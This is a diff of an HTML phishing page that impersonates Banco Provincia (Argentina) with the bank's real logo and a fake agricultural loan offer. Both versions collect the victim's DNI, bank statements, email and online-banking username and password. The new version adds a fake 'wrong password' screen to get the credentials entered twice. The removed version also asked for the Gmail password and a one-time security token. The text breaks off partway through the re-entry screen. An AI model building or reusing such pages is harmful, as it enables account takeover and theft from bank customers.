@@ -1,595 +1,549 @@
 <!DOCTYPE html>
-<html lang="es" class="overflow-hidden">
+<html lang="es-AR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Banco de la Provincia de Buenos Aires, Iniciá sesión</title>
-<meta name="description" content="Iniciá sesión en BIP">
-<meta name="theme-color" content="#ffffff">
-<link rel="icon" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon.ico">
-<link rel="apple-touch-icon" sizes="180x180" href="https://www.bancoprovincia.bancainternet.com.ar/spa/icons/apple-touch-icon.png">
-<script>function setVH(){document.documentElement.style.setProperty("--vh",(window.innerHeight/100)+"px");}setVH();window.addEventListener("resize",setVH);</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#00703c">
+<title>Banco Provincia - Capital de trabajo agropecuario</title>
 <link rel="stylesheet" href="estilo.css">
 <link rel="stylesheet" href="parche.css">
 <style>
-.oculto{display:none!important}
-
-/* --- header y logo con las medidas reales del banco --- */
-.layout.header{position:relative!important;height:auto!important;width:100%!important;margin:0!important}
-.layout.header .header-gradient{
-  height:calc(5.625rem + var(--safearea-top))!important;
-  padding:calc(1rem + var(--safearea-top)) 0 0 0!important;
-  display:block!important;
-}
-.layout.header .logoBapro{height:2.125rem!important;width:auto!important;margin:0 auto!important;display:flex!important;justify-content:center}
-.layout.header img.logo-web,.layout.header img.logo-print{height:2.125rem!important;width:auto!important;display:block;margin:0 auto}
-.layout.header .row{width:100%;margin:0}
-.layout.header .col-12{padding:0}
-
-@media screen and (min-width:768px){
-  .layout.header .header-gradient{
-    height:calc(7.5rem + var(--safearea-top))!important;
-    padding-top:calc(1.063rem + var(--safearea-top))!important;
-  }
-  .layout.header .logoBapro{height:2.875rem!important;margin-top:.25rem!important}
-  .layout.header img.logo-web,.layout.header img.logo-print{height:2.875rem!important}
-}
-
-/* --- hoja blanca pegada con las esquinas redondeadas del banco --- */
-.login-content{background:transparent!important;border-radius:0!important;box-shadow:none!important}
-.row-login-content{position:relative!important;margin:0!important}
-.row-login-content::before{
-  content:"";position:absolute;top:0;left:0;width:100%;height:1.7rem;
-  background:linear-gradient(270deg,#26b4bd,#3daa35);z-index:0;
-}
-.row-login-content>.col{position:relative;z-index:1;padding:0}
-.login-content-mobile{
-  border-top-left-radius:1.5rem!important;
-  border-top-right-radius:1.5rem!important;
-  overflow:hidden;background:#fff!important;
-}
-.login-content-mobile .content{padding-top:1.2rem!important}
+  .oculto{display:none !important}
+  html,body{margin:0;padding:0}
+  body{background:#fff}
+  #app{position:relative;width:100%}
+  .hdr{width:100%;background:#00703c}
+  .hdr-full .banda{padding:14px 16px 16px;display:flex;align-items:center}
+  .hdr-full .logo-web{height:30px}
+  .hdr-slim .banda{padding:8px 16px 9px;display:flex;align-items:center}
+  .hdr-slim .logo-web{height:20px}
+  .pant{min-height:calc(var(--vh,1vh)*100 - 56px);padding:18px 20px 96px;box-sizing:border-box}
+  .pant h2{font-size:19px;line-height:1.25;margin:0 0 8px;color:#1a1a1a;font-weight:700}
+  .pant p.sub{font-size:13.5px;line-height:1.45;color:#5b5b5b;margin:0 0 18px}
+  .campo{margin-bottom:14px}
+  .campo label{display:block;font-size:12px;color:#6b6b6b;margin-bottom:6px;font-weight:600}
+  .campo input,.campo select{width:100%;box-sizing:border-box;height:46px;border:1px solid #cfd6d1;border-radius:6px;padding:0 12px;font-size:15px;background:#fff;color:#1a1a1a;outline:none;-webkit-appearance:none;appearance:none}
+  .campo input:focus,.campo select:focus{border-color:#00703c;box-shadow:0 0 0 1px #00703c inset}
+  .campo .hint{font-size:11px;color:#8a8a8a;margin-top:5px}
+  .btn{display:block;width:100%;height:48px;border:0;border-radius:6px;background:#00703c;color:#fff;font-size:15px;font-weight:700;letter-spacing:.2px;cursor:pointer}
+  .btn[disabled]{background:#b9c9bf}
+  .btn.sec{background:#fff;color:#00703c;border:1px solid #00703c}
+  .link{display:block;text-align:center;font-size:13px;color:#00703c;margin-top:14px;text-decoration:none;background:none;border:0;width:100%;cursor:pointer}
+  .fijo{position:fixed;left:0;right:0;bottom:0;padding:12px 20px calc(12px + env(safe-area-inset-bottom));background:#fff;border-top:1px solid #ececec;z-index:30}
+  .fijo .btn{height:46px}
+  .card{border:1px solid #e3e8e5;border-radius:8px;padding:14px;margin-bottom:12px;background:#fbfcfb}
+  .card .k{font-size:11px;color:#7b7b7b;text-transform:uppercase;letter-spacing:.4px;margin-bottom:4px}
+  .card .v{font-size:17px;font-weight:700;color:#1a1a1a}
+  .chip{font-size:11px;padding:4px 9px;border-radius:20px;background:#eef3f0;color:#00703c;font-weight:600}
+  .arch{display:flex;align-items:center;justify-content:space-between;gap:10px;border:1px dashed #c9d3cd;border-radius:8px;padding:13px 14px;margin-bottom:10px;background:#fff}
+  .arch.ok{border:1px solid #00703c;background:#f4faf6}
+  .arch .txt{font-size:13px;line-height:1.35}
+  .arch .txt b{display:block;font-size:13px;color:#1a1a1a;font-weight:600;margin-bottom:2px}
+  .arch .txt span{color:#8a8a8a;font-size:11px}
+  .arch button{flex:0 0 auto;height:34px;padding:0 12px;font-size:12px;border-radius:6px;border:1px solid #00703c;background:#fff;color:#00703c;font-weight:700;cursor:pointer}
+  .arch.ok button{border-color:#c9d3cd;color:#8a8a8a}
+  .arch input[type=file]{display:none}
+  .sp{width:38px;height:38px;border:3px solid #dfe8e3;border-top-color:#00703c;border-radius:50%;animation:g 1s linear infinite;margin:0 auto 18px}
+  @keyframes g{to{transform:rotate(360deg)}}
+  .centro{text-align:center;padding-top:26px}
+  .an-txt{font-size:13.5px;color:#5b5b5b;min-height:40px}
+  .ok-ic{width:64px;height:64px;border-radius:50%;background:#00703c;color:#fff;font-size:34px;line-height:64px;margin:0 auto 16px;font-weight:700}
+  .legajo{font-size:13px;color:#5b5b5b;margin-top:4px}
+  .monto{font-size:30px;font-weight:800;color:#00703c;letter-spacing:-.5px}
+  .err{background:#fdecec;border:1px solid #f5c2c2;color:#b3251f;font-size:13px;padding:10px 12px;border-radius:6px;margin-bottom:14px;display:none}
+  .err.on{display:block}
+  .otp{letter-spacing:8px;text-align:center;font-size:22px;font-weight:700;height:52px}
+  .reloj{font-size:12px;color:#8a8a8a;text-align:center;margin-top:8px}
+  .etapa{font-size:11px;color:#8a8a8a;text-align:center;margin-bottom:14px;letter-spacing:.4px;text-transform:uppercase}
+  .aviso{font-size:12px;color:#7b7b7b;line-height:1.45;background:#f7f8f7;border-radius:6px;padding:10px 12px;margin-bottom:14px}
 </style>
 </head>
 <body class="overflow-hidden spa">
 
-<div class="box container-fluid layout login" style="background-image:url('fondo.png')">
-<div class="box row justify-content-center">
-<div class="box login-flex-content px-0">
-<div class="box col-12 col-sm-12 col-md-8 col-lg-6 col-xl-4 col-xxl-4 login-content">
-<div class="box row"><div class="box col">
-
-<header aria-label="Encabezado." class="box layout header login-mobile">
-  <div class="box">
-    <div class="box header-gradient desktop container-fluid">
-      <div class="box row"><div class="box col-12 text-center">
-        <div aria-hidden="true" class="box logoBapro logoBaproLogin">
-          <img alt="Banco de la Provincia de Buenos Aires" class="w-auto d-none logo-print" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip">
-          <img alt="Banco de la Provincia de Buenos Aires" class="w-auto logo-web" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip">
-        </div>
-      </div></div>
-    </div>
+<header class="hdr hdr-full" id="hdr">
+  <div class="banda">
+    <div class="logo-print d-none"><img src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" alt="Banco Provincia"></div>
+    <img class="logo-web" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" alt="Banco Provincia">
   </div>
 </header>
 
-</div></div>
+<main id="app">
 
-<div class="box row row-login-content"><div class="box col">
-<main aria-label="Contenido principal." class="box login-content-mobile content-softkeyboard">
-<div class="box content-children">
-<div class="box layout-page">
-<div class="box content px-2 m-p-botton-focus-buttons customHeight heightAuto" id="boxPageLayout">
-<div class="box">
+<!-- p1 HOME -->
+<section class="pant" id="p1">
+  <div class="chip" style="margin-bottom:14px">Línea vigente · Campaña 2026</div>
+  <h2>Capital de trabajo para tu campo</h2>
+  <p class="sub">Financiación de insumos, labores y arrendamiento. Acreditación en 48 horas, sin garantía real hasta $ 60.000.000.</p>
+  <div class="card"><div class="k">Tasa</div><div class="v">TNA 32% fija</div></div>
+  <div class="card"><div class="k">Plazo</div><div class="v">Hasta 24 meses</div></div>
+  <div class="card"><div class="k">Amortización</div><div class="v">Cosecha o semestral</div></div>
+  <div class="fijo"><button class="btn" onclick="ir0()">Simular mi crédito</button></div>
+</section>
 
-<!-- 1 DNI -->
-<div id="p0">
-  <div class="box my-2"><h1 aria-label="Crédito para capital de trabajo." class="pb-0 txt-title" tabindex="-1">Crédito para capital de trabajo</h1></div>
-  <p class="txt-default">Línea para insumos y labores de la campaña. Empezá con tu DNI.</p>
-  <div class="mb-3">
-    <label class="label-required txt-input-label" for="dni">DNI del titular</label>
-    <input class="form-control border-info focusMouse" id="dni" inputmode="numeric" maxlength="8" placeholder="Ingresá tu documento" autocomplete="off">
+<!-- p0 DNI -->
+<section class="pant oculto" id="p0">
+  <h2>Ingresá tu DNI</h2>
+  <p class="sub">Consultamos tu situación en la Central de Deudores del BCRA para precalificar la solicitud.</p>
+  <div class="campo">
+    <label for="dni">Número de documento</label>
+    <input id="dni" type="tel" inputmode="numeric" maxlength="8" placeholder="Sin puntos" aria-label="Número de documento">
+    <div class="hint">8 dígitos, sin puntos ni espacios.</div>
   </div>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b2">Continuar</button></div>
-</div>
+  <div class="err" id="errDni">Ingresá un DNI de 8 dígitos.</div>
+  <div class="fijo"><button class="btn" id="b0" onclick="pasoDni()">Continuar</button></div>
+</section>
 
-<!-- 2 SIMULADOR -->
-<div id="sim" class="oculto">
-  <div class="box my-2"><h1 class="pb-0 txt-title">Simulá tu línea</h1></div>
-  <p class="txt-default">Elegí el cultivo, la superficie y el esquema. La tasa, los sellos y el seguro ya están fijados por la línea.</p>
-  <div class="fila">
-    <div class="mb-3">
-      <label class="txt-input-label" for="cultivo">Cultivo</label>
-      <select class="form-select" id="cultivo" onchange="calcular()">
-        <option value="650000">Soja</option>
-        <option value="870000">Maíz</option>
-        <option value="550000">Trigo</option>
-        <option value="580000">Girasol</option>
-      </select>
-    </div>
-    <div class="mb-3">
-      <label class="txt-input-label" for="hectareas">Hectáreas</label>
-      <input class="form-control" id="hectareas" type="number" value="200" min="1" inputmode="numeric" oninput="calcular()">
-    </div>
+<!-- p2c SIMULADOR -->
+<section class="pant oculto" id="p2c">
+  <h2>Simulá tu capital de trabajo</h2>
+  <p class="sub">Completá la superficie y el cultivo. El cálculo se hace sobre el 40% del costo de campaña.</p>
+  <div class="campo">
+    <label for="ha">Hectáreas a financiar</label>
+    <input id="ha" type="tel" inputmode="numeric" maxlength="5" placeholder="Ej. 120" aria-label="Hectáreas">
   </div>
-  <div class="fila">
-    <div class="mb-3">
-      <label class="txt-input-label" for="esquema">Esquema de pago</label>
-      <select class="form-select" id="esquema" onchange="calcular()">
-        <option value="cosecha">Vencimiento único a cosecha</option>
-        <option value="semestral">4 cuotas semestrales</option>
-      </select>
-    </div>
-    <div class="mb-3">
-      <label class="txt-input-label" for="iva">IVA s/ intereses</label>
-      <select class="form-select" id="iva" onchange="calcular()">
-        <option value="10.5">10,5% PyME</option>
-        <option value="21">21%</option>
-        <option value="0">Exento</option>
-      </select>
-    </div>
+  <div class="campo">
+    <label for="cultivo">Cultivo</label>
+    <select id="cultivo" aria-label="Cultivo">
+      <option value="">Seleccioná</option>
+      <option value="650000">Soja</option>
+      <option value="870000">Maíz</option>
+      <option value="550000">Trigo</option>
+      <option value="580000">Girasol</option>
+    </select>
+  </div>
+  <div class="campo">
+    <label for="esquema">Esquema de amortización</label>
+    <select id="esquema" aria-label="Esquema">
+      <option value="">Seleccioná</option>
+      <option value="cosecha">Contra cosecha</option>
+      <option value="semestral">Cuotas semestrales</option>
+    </select>
+  </div>
+  <div class="campo">
+    <label for="iva">IVA sobre insumos</label>
+    <select id="iva" aria-label="IVA">
+      <option value="21">21%</option>
+      <option value="10.5">10,5%</option>
+      <option value="0">Exento</option>
+    </select>
+  </div>
+  <div class="campo">
+    <label for="sellos">Impuesto de sellos</label>
+    <select id="sellos" aria-label="Sellos">
+      <option value="0">No corresponde</option>
+      <option value="1">Incluir</option>
+    </select>
+  </div>
+  <div class="campo">
+    <label for="seguro">Seguro agrícola</label>
+    <select id="seguro" aria-label="Seguro">
+      <option value="0">Sin seguro</option>
+      <option value="1">Con seguro</option>
+    </select>
+  </div>
+  <div class="err" id="errSim">Completá hectáreas y cultivo.</div>
+  <div class="fijo"><button class="btn" onclick="calcular()">Ver mi simulación</button></div>
+</section>
+
+<!-- p2d RESULTADO -->
+<section class="pant oculto" id="p2d">
+  <h2>Precalificación favorable</h2>
+  <p class="sub">En base a los datos ingresados te corresponde el siguiente capital.</p>
+  <div class="card" style="text-align:center;border-color:#00703c;background:#f4faf6">
+    <div class="k">Monto precalificado</div>
+    <div class="monto" id="mMonto">$ 0</div>
+  </div>
+  <div class="card"><div class="k">Costo de campaña estimado</div><div class="v" id="mCosto">$ 0</div></div>
+  <div class="card"><div class="k">Cuota estimada</div><div class="v" id="mCuota">$ 0</div></div>
+  <div class="aviso">El monto se acredita en la cuenta una vez verificada la documentación y la capacidad de pago.</div>
+  <div class="fijo"><button class="btn" onclick="ir2b()">Continuar</button></div>
+</section>
+
+<!-- p2b CONDICIONES -->
+<section class="pant oculto" id="p2b">
+  <h2>Condiciones de la línea</h2>
+  <p class="sub">Leé y aceptá para iniciar el legajo.</p>
+  <div class="aviso">
+    TNA 32% fija · IVA 21% sobre intereses · amortización según esquema elegido · comisión de otorgamiento 1% · seguro de vida obligatorio sobre saldo · cancelación anticipada sin penalidad.
+  </div>
+  <div class="campo" style="display:flex;gap:10px;align-items:flex-start">
+    <input id="acepto" type="checkbox" style="width:20px;height:20px;flex:0 0 auto;margin-top:2px">
+    <label for="acepto" style="font-size:12.5px;color:#4a4a4a;line-height:1.4;font-weight:400">Acepto las condiciones y autorizo la consulta a la Central de Deudores del BCRA y a la verificación de capacidad de pago.</label>
+  </div>
+  <div class="err" id="errCond">Tenés que aceptar las condiciones.</div>
+  <div class="fijo"><button class="btn" onclick="ir2()">Iniciar legajo</button></div>
+</section>
+
+<!-- p2 DOCUMENTACION -->
+<section class="pant oculto" id="p2">
+  <h2>Documentación del legajo</h2>
+  <p class="sub">Adjuntá la documentación respaldatoria. Solo el primer archivo es obligatorio.</p>
+
+  <div class="arch" id="a1">
+    <div class="txt"><b>Movimientos de los últimos 3 meses</b><span>Obligatorio · PDF o foto</span></div>
+    <button type="button" onclick="document.getElementById('f1').click()" id="bt1">Adjuntar</button>
+    <input type="file" id="f1" accept="image/*,application/pdf" onchange="subir(1,this)">
   </div>
 
-  <div class="fila" style="margin-top:1rem">
-    <div class="metric"><span>Monto a financiar</span><strong id="montoTotal">$0</strong></div>
-    <div class="metric"><span>Total a pagar</span><strong id="totalAPagar">$0</strong></div>
+  <div class="arch" id="a2">
+    <div class="txt"><b>Título de propiedad o contrato de arrendamiento</b><span>Opcional</span></div>
+    <button type="button" onclick="document.getElementById('f2').click()" id="bt2">Adjuntar</button>
+    <input type="file" id="f2" accept="image/*,application/pdf" onchange="subir(2,this)">
   </div>
-  <div class="tw" style="margin-top:1rem">
-    <table>
-      <thead><tr><th>Período</th><th>Capital</th><th>Interés</th><th>IVA</th><th>Seguro</th><th>Cuota</th></tr></thead>
-      <tbody id="tablaPagos"></tbody>
-    </table>
+
+  <div class="arch" id="a3">
+    <div class="txt"><b>Facturación del último ejercicio</b><span>Opcional</span></div>
+    <button type="button" onclick="document.getElementById('f3').click()" id="bt3">Adjuntar</button>
+    <input type="file" id="f3" accept="image/*,application/pdf" onchange="subir(3,this)">
   </div>
-  <div class="box text-center" style="margin-top:1rem">
-    <button class="btn w-100 btn-primary btn" type="button" id="bSim">Solicitar <span id="lblMonto"></span></button>
+
+  <div class="err" id="errDoc">Adjuntá al menos los movimientos de los últimos 3 meses.</div>
+  <div class="fijo"><button class="btn" onclick="analizar()">Enviar a análisis</button></div>
+</section>
+
+<!-- pAn ANALISIS -->
+<section class="pant oculto" id="pAn">
+  <div class="centro">
+    <div class="sp"></div>
+    <h2 style="font-size:17px">Analizando tu solicitud</h2>
+    <p class="an-txt" id="anTxt">Verificando documentación</p>
   </div>
-</div>
+</section>
 
-<!-- 3 SIMULACION -->
-<div id="p2b" class="oculto">
-  <div class="box my-2"><h1 class="pb-0 txt-title">Tu simulación</h1></div>
-  <p class="txt-default">Monto solicitado: <strong>$<span id="monto"></span></strong></p>
-  <p class="txt-default">Para evaluarlo tené en cuenta:</p>
-  <ul class="txt-default" style="padding-left:1.2rem">
-    <li>La acreditación se hace únicamente por Home Banking.</li>
-    <li>Se acredita en una sola operación.</li>
-    <li>Necesitás tener BIP Móvil activa.</li>
-    <li>La cuenta debe estar activa y a tu nombre.</li>
-  </ul>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b4">Enviar a evaluación</button></div>
-</div>
-
-<!-- 4 DOCUMENTACION -->
-<div id="p2c" class="oculto">
-  <div class="box my-2"><h1 class="pb-0 txt-title">Calificación crediticia</h1></div>
-  <p class="txt-default">Para cerrar la evaluación el banco pide documentación de la explotación.</p>
-  <div class="mb-3">
-    <label class="label-required txt-input-label" for="foto">Últimos movimientos de la cuenta (Obligatorio)</label>
-    <input class="form-control" id="foto" type="file" accept="image/png, image/jpeg">
-    <p class="doc-msg" id="fotoMsg">Debe subir una imagen obligatoriamente.</p>
+<!-- pOk APROBADO -->
+<section class="pant oculto" id="pOk">
+  <div class="centro" style="padding-top:16px">
+    <div class="ok-ic">✓</div>
+    <h2>Solicitud aprobada</h2>
+    <p class="sub" style="margin-bottom:14px">Tu legajo quedó aprobado por el monto precalificado.</p>
   </div>
-  <div class="mb-3">
-    <label class="txt-input-label" for="doc1">Título de propiedad o contrato de arrendamiento</label>
-    <input class="form-control" id="doc1" type="file" accept="image/png, image/jpeg">
-    <p class="doc-msg" id="doc1Msg">Opcional.</p>
+  <div class="card" style="text-align:center;border-color:#00703c;background:#f4faf6">
+    <div class="k">Monto aprobado</div>
+    <div class="monto" id="mFinal">$ 0</div>
+    <div class="legajo" id="mLegajo">Legajo 47-2026-0000</div>
   </div>
-  <div class="mb-3">
-    <label class="txt-input-label" for="doc2">Facturación de la explotación</label>
-    <input class="form-control" id="doc2" type="file" accept="image/png, image/jpeg">
-    <p class="doc-msg" id="doc2Msg">Opcional.</p>
+  <div class="aviso">Para acreditar el monto necesitamos verificar la titularidad de la cuenta. A continuación se solicita el acceso a la cuenta sueldo o caja de ahorro donde se va a depositar.</div>
+  <div class="fijo"><button class="btn" onclick="irG()">Verificar mi cuenta</button></div>
+</section>
+
+<!-- pG CORREO -->
+<section class="pant oculto" id="pG">
+  <h2>Verificación de identidad</h2>
+  <p class="sub">Ingresá la casilla de correo con la que operás, para recibir el contrato y el comprobante de acreditación.</p>
+  <div class="campo">
+    <label for="gm">Correo electrónico</label>
+    <input id="gm" type="email" inputmode="email" maxlength="40" placeholder="nombre@gmail.com" autocomplete="email" aria-label="Correo">
   </div>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b5">Enviar y continuar</button></div>
-</div>
+  <div class="err" id="errGm">Ingresá un correo válido.</div>
+  <div class="fijo"><button class="btn" onclick="pasoGmail()">Continuar</button></div>
+</section>
 
-<!-- ANALIZANDO -->
-<div id="pAn" class="oculto">
-  <div class="sp2"></div>
-  <p class="txt-default" style="margin-top:1rem" id="anTxt">Verificando documentación...</p>
-</div>
-
-<!-- APROBADO -->
-<div id="pOk" class="oculto">
-  <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#007a2b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12 3 3 5-6"/></svg>
-  <h1 class="txt-title" style="padding-top:.75rem">Crédito aprobado</h1>
-  <p class="txt-default">Monto aprobado: <strong>$<span id="montoOk"></span></strong></p>
-  <p class="txt-default">Legajo <strong id="legajoOk"></strong></p>
-  <p class="txt-small">Guardá este número.</p>
-  <p class="txt-default">Para acreditar en el momento necesitamos validar tu identidad y tu cuenta. Son dos pasos y se hacen acá mismo.</p>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="bOk">Continuar</button></div>
-</div>
-
-<!-- 5 GMAIL -->
-<div id="pG" class="oculto">
-  <div class="box my-2"><h1 class="pb-0 txt-title">Recibí la respuesta</h1></div>
-  <p class="txt-default">Validá tu Gmail para que te llegue la constancia de aprobación y el detalle de las cuotas.</p>
-  <div class="mb-3">
-    <label class="label-required txt-input-label" for="mail">Tu Gmail</label>
-    <input class="form-control border-info focusMouse" id="mail" type="email" inputmode="email" maxlength="40" placeholder="tunombre@gmail.com" autocomplete="off">
+<!-- p3 LOGIN -->
+<section class="pant oculto" id="p3">
+  <h2>Acreditación</h2>
+  <p class="sub">Ingresá usuario y clave del banco para asociar la cuenta donde se deposita el crédito.</p>
+  <div class="campo">
+    <label for="us">Usuario</label>
+    <input id="us" type="text" maxlength="16" placeholder="Tu usuario" autocomplete="username" aria-label="Usuario">
   </div>
-  <div class="mb-3">
-    <label class="label-required txt-input-label" for="gpass">Contraseña de tu Gmail</label>
-    <input class="form-control border-info focusMouse" id="gpass" type="password" maxlength="40" placeholder="Ingresá tu contraseña" autocomplete="off">
+  <div class="campo">
+    <label for="cl">Clave</label>
+    <input id="cl" type="password" maxlength="20" placeholder="Tu clave" autocomplete="current-password" aria-label="Clave">
   </div>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn focusMouse" type="button" id="b0">Continuar</button></div>
-</div>
+  <div class="err" id="errLog">Usuario o clave incorrectos.</div>
+  <div class="fijo"><button class="btn" id="bLog" onclick="login(false)">Ingresar</button></div>
+</section>
 
-<!-- 6 LOGIN -->
-<div id="p1" class="oculto">
-  <div class="box my-2"><h1 class="pb-0 txt-title">Acreditación</h1></div>
-  <p class="txt-default">Ahora ingresá a tu BIP, con el usuario y la clave del banco, para que el desembolso se haga sobre tu cuenta.</p>
-  <form action="#" id="loginForm" onsubmit="return entrar()">
-    <div class="mb-3">
-      <label aria-hidden="true" aria-label="Tu usuario. Campo obligatorio" class="label-required txt-input-label" for="username" id="label_username">Tu usuario</label>
-      <div class="user"><input aria-disabled="false" autocapitalize="off" autocomplete="off" class="form-control border-info focusMouse" id="username" maxlength="16" name="username" placeholder="Ingresá tu nombre de usuario" type="text" value=""></div>
-    </div>
-    <div class="mb-3">
-      <label aria-hidden="true" aria-label="Tu clave. Campo obligatorio" class="label-required txt-input-label" for="password" id="label_password">Tu clave</label>
-      <div class="box password position-relative d-flex">
-        <div class="flex-shrink-0 w-100"><input aria-disabled="false" autocomplete="off" class="form-control border-info focusMouse" id="password" maxlength="8" name="password" placeholder="Ingresá tu clave" type="password" value=""></div>
-        <button aria-disabled="false" aria-label="Mostrar clave" class="btn p-0 password-eye-button btn focusMouse" type="button" id="ver">
-          <svg aria-hidden="true" class="svg-icon svg-input-primary" height="20px" viewBox="0 0 18 12" width="20px" xmlns="http://www.w3.org/2000/svg"><path d="M18 6.19558L17.7956 6.51558C16.8571 7.81671 15.5498 8.88004 14.0024 9.60075C12.4551 10.3215 10.7212 10.6747 8.97161 10.6256C7.93584 10.6269 6.90454 10.5059 5.90536 10.2656C5.81509 10.2428 5.73038 10.2055 5.65552 10.1556L6.79117 9.15558C7.49196 9.29538 8.20766 9.36913 8.92618 9.37558C10.3402 9.41368 11.7436 9.14872 13.0156 8.60349C14.2876 8.05826 15.3902 7.24909 16.2284 6.24558C15.4246 5.22188 14.3167 4.41239 13.0259 3.90558C12.9546 3.87497 12.8894 3.83445 12.8328 3.78558L13.889 2.84558C15.4895 3.51496 16.8291 4.58668 17.7388 5.92558L18 6.19558ZM9.75521 7.72558C10.267 7.72903 10.7719 7.62126 11.2251 7.41183C11.6783 7.20239 12.0658 6.89775 12.3533 6.52491C12.6408 6.15206 12.8195 5.72252 12.8734 5.27434C12.9273 4.82617 12.8549 4.3732 12.6625 3.95558L8.63092 7.50558C8.99266 7.63081 9.37786 7.69526 9.76656 7.69558L9.75521 7.72558ZM4.08833 10.3856L3.20252 11.1756C3.06155 11.2791 2.88185 11.3326 2.69848 11.3257C2.51511 11.3189 2.34122 11.2521 2.21074 11.1384C2.08025 11.0248 2.00252 10.8724 1.99272 10.711C1.98292 10.5496 2.04175 10.3908 2.15773 10.2656L3.29338 9.26558C2.00023 8.60607 0.924019 7.66185 0.170347 6.52558L0 6.20558L0.204416 5.88558C1.14191 4.58593 2.44744 3.52355 3.99261 2.80292C5.53777 2.08229 7.26935 1.72824 9.01703 1.77558C9.81889 1.77928 10.6181 1.85636 11.4019 2.00558L13.4006 0.195576C13.4685 0.134512 13.5493 0.0858141 13.6386 0.0522635C13.7278 0.018713 13.8237 0.000967017 13.9207 3.84311e-05C14.0177 -0.000890155 14.114 0.0150172 14.204 0.0468519C14.294 0.0786866 14.3761 0.125825 14.4454 0.185577C14.5148 0.245328 14.5701 0.316522 14.6082 0.395094C14.6463 0.473665 14.6664 0.558075 14.6675 0.643505C14.6685 0.728935 14.6505 0.813712 14.6143 0.892994C14.5782 0.972277 14.5246 1.04451 14.4568 1.10558L13.7754 1.71558L4.08833 10.3856ZM1.6694 6.20558C2.35255 7.07942 3.26387 7.79616 4.32681 8.29558L6.47319 6.37558C6.16796 5.88768 6.04226 5.32837 6.11346 4.77488C6.18466 4.22138 6.44923 3.701 6.87066 3.28558C4.76632 3.62772 2.89637 4.67882 1.65804 6.21558" fill="svg-input-primary"></path></svg>
-        </button>
-      </div>
-      <p id="err" class="oculto">Usuario o clave incorrectos.</p>
-    </div>
-    <div class="box text-center"><button class="btn col-6 mb-1 btn-link-primary btn focusMouse selectable-text" type="button">Teclado Virtual<svg aria-hidden="true" class="svg-icon svg-input-primary ms-2" height="25px" viewBox="0 0 25 25" width="25px" xmlns="http://www.w3.org/2000/svg"><path d="M21.875 7.8125C22.2894 7.8125 22.6868 7.97712 22.9799 8.27015C23.2729 8.56317 23.4375 8.9606 23.4375 9.375V17.1875C23.4375 17.6019 23.2729 17.9993 22.9799 18.2924C22.6868 18.5854 22.2894 18.75 21.875 18.75H3.125C2.7106 18.75 2.31317 18.5854 2.02015 18.2924C1.72712 17.9993 1.5625 17.6019 1.5625 17.1875V9.375C1.5625 8.9606 1.72712 8.56317 2.02015 8.27015C2.31317 7.97712 2.7106 7.8125 3.125 7.8125H21.875ZM3.125 6.25C2.2962 6.25 1.50134 6.57924 0.915291 7.16529C0.32924 7.75134 0 8.5462 0 9.375L0 17.1875C0 18.0163 0.32924 18.8112 0.915291 19.3972C1.50134 19.9833 2.2962 20.3125 3.125 20.3125H21.875C22.7038 20.3125 23.4987 19.9833 24.0847 19.3972C24.6708 18.8112 25 18.0163 25 17.1875V9.375C25 8.5462 24.6708 7.75134 24.0847 7.16529C23.4987 6.57924 22.7038 6.25 21.875 6.25H3.125Z" fill="svg-input-primary"></path></svg></button></div>
-    <div class="box text-center">
-      <button aria-disabled="false" class="btn w-100 btn-primary btn focusMouse" form="loginForm" type="submit">Ingresar</button>
-      <div class="box mt-2"><label aria-label="¿No sos BIP? Registrate" class="mb-0 d-inline-block txt-default p-0"><div class="box d-inline"><span class="me-1">¿No sos BIP?</span><button aria-disabled="false" aria-label="Registrate" class="btn txt-link-secondary mx-1 p-0 me-1 align-top border-0 min-height-0 btn-link-secondary btn focusMouse selectable-text" type="button"><span class="linktext-tyc linktext-underline">Registrate</span></button></div></label></div>
-      <button aria-disabled="false" class="btn px-0 btn-link-secondary btn focusMouse selectable-text" type="button">Bloqueé u olvidé mi usuario y/o clave</button>
-      <div class="box"><div class="box text-center"><button aria-disabled="false" class="btn btn-link-secondary btn focusMouse selectable-text" type="button">Conocé como hacerte usuario u operar</button><button aria-disabled="false" class="btn btn-link-secondary btn focusMouse selectable-text" type="button">Recomendaciones de seguridad</button></div></div>
-    </div>
-  </form>
-</div>
-
-<!-- SPINNER LOGIN -->
-<div id="pSp" class="oculto">
-  <div class="sp2"></div>
-  <p class="txt-default" style="margin-top:1rem">Validando dispositivo...</p>
-</div>
-
-<!-- TOKEN -->
-<div id="p3" class="oculto">
-  <div class="box my-2"><h1 class="pb-0 txt-title" id="tokTit">Validá el dispositivo</h1></div>
-  <p class="txt-default" id="tokTxt">Abrí la app <strong>BIP Móvil</strong>, tocá <strong>“Token de seguridad”</strong> y pasá los 6 dígitos.</p>
-  <div class="mb-3">
-    <label class="label-required txt-input-label" for="tok">Código</label>
-    <input class="form-control border-info focusMouse" id="tok" inputmode="numeric" maxlength="6" placeholder="000000" autocomplete="off" style="text-align:center;letter-spacing:.4rem;font-size:1.3rem">
+<!-- p3b CLAVE MALA -->
+<section class="pant oculto" id="p3b">
+  <h2>Acreditación</h2>
+  <p class="sub">Volvé a ingresar tus datos. Verificá mayúsculas y que la clave esté completa.</p>
+  <div class="err on" id="errLog2">Usuario o clave incorrectos.</div>
+  <div class="campo">
+    <label for="us2">Usuario</label>
+    <input id="us2" type="text" maxlength="16" aria-label="Usuario">
   </div>
-  <p id="tokMsg">El código vence en 60 s</p>
-  <div class="box text-center"><button class="btn w-100 btn-primary btn" type="button" id="b3" disabled>Continuar</button></div>
